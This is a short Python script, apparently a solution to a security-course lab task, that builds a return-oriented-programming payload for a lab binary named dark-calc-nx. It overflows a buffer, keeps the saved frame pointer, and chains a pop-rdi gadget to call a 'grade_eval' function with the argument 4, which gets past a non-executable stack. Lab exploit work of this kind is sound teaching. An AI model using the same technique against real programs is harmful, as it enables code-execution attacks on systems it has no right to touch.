#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b"0" * 16

# keep rbp
payload = payload + b"\xf0\x0f\x80\x00\x10\x72\x00\x00"

# jump to 0x401a33 (pop rdi; ret;)
payload = payload + b"\x33\x1a\x40\x00\x00\x00\x00\x00"

# rdi <- 4
payload = payload + b"\x04\x00\x00\x00\x00\x00\x00\x00"

# jump to 0x401978 (grade_eval)
payload = payload + b"\x78\x19\x40\x00\x00\x00\x00\x00"

sys.stdout.buffer.write(payload)
